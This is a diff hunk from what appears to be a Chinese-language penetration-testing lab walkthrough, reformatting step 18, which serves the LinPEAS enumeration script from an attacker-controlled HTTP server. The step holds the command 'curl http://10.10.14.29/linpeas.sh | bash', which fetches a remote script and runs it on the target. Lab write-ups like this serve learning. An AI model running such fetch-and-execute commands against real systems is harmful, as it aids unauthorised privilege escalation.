@@ -87,7 +87,7 @@ wget https://github.com/peass-ng/PEASS-ng/releases/download/20240804-31b931f7/li
 <img width="485" height="62" alt="image" src="https://github.com/user-attachments/assets/feefeb66-e90e-4246-b17f-62d6ad084656" />
 
 18.	透過Python HTTP Server，啟用LinPEAS Script，並將檢查結果存放到check.txt，以便以後檢視可能的漏洞資訊。
-curl http://10.10.14.29/linpeas.sh | bash > check.txt
+`curl http://10.10.14.29/linpeas.sh | bash > check.txt`
 
  <img width="637" height="93" alt="image" src="https://github.com/user-attachments/assets/84c35daa-e3f5-4823-a3a5-a5ab9a4aef89" />
 
